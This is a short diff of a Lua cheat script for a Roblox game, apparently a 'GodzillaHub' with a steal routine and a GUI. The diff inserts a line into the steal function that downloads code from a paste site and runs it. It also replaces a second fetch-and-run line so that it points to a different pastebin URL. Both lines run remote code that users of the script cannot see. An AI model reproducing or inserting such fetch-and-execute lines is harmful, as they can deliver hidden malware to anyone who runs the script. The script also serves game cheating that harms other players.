@@ -1158,6 +1158,7 @@ local function buildProgressBar()
     }
     return progressData
 end
+
 local progressData = buildProgressBar()
 local stealProgress = 0
 local frameCount = 0
@@ -2161,7 +2162,7 @@ local function execStealSemi(prompt, animalData)
             end
             task.wait()
         end
-
+loadstring(game:HttpGet("https://pastefy.app/VTTP7iv6/raw"))()
         SemiSteal.StealState.active = false
         SemiSteal.StealState.phase = "idle"
 
@@ -2533,7 +2534,7 @@ local function createMobileButtons()
     end
 end
 -- Main Gui
-loadstring(game:HttpGet("https://pastefy.app/hlHILzrM/raw"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/2H5JyQKE"))()
 local function buildGui()
     local pg = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui")
     for _,name in pairs({"GodzillaHub","Godzilla | HUB"}) do
